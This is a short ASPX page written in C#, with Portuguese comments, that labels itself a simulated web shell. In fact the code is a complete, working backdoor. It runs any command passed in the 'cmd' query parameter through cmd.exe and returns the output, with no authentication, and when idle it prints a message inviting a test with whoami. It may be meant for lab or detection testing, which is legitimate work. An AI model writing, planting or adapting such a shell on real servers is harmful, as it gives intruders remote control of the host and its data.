
<%@ Page Language="C#" %>
<%
// Webshell simulada: executa comandos via parâmetro GET
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
	System.Diagnostics.Process proc = new System.Diagnostics.Process();
	proc.StartInfo.FileName = "cmd.exe";
	proc.StartInfo.Arguments = "/c " + cmd;
	proc.StartInfo.UseShellExecute = false;
	proc.StartInfo.RedirectStandardOutput = true;
	proc.Start();
	string output = proc.StandardOutput.ReadToEnd();
	proc.WaitForExit();
	Response.Write("<pre>" + output + "</pre>");
} else {
	Response.Write("Webshell Win ASPX ativa. Use ?cmd=whoami para testar.");
}
%>
